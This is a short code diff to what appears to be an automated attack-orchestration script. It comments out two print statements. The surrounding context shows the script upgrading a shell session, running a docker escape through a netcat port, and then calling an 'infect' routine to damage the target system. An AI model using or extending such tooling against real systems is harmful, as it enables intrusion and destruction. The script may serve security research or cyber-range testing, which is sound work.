@@ -46,7 +46,7 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
 
         if(atk_sess!=None):
             met_sess=mc.upgrade_shell(atk_sess)
-            print(met_sess)
+            #print(met_sess)
 
 
         if(target_ip in other_subnet):
@@ -144,7 +144,7 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                         escape = mc.docker_escape(docker_escape_attack_object)
                         if(escape):
-                            print(escape)
+                            #print(escape)
                             print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
                             mc.infect()
                         else:
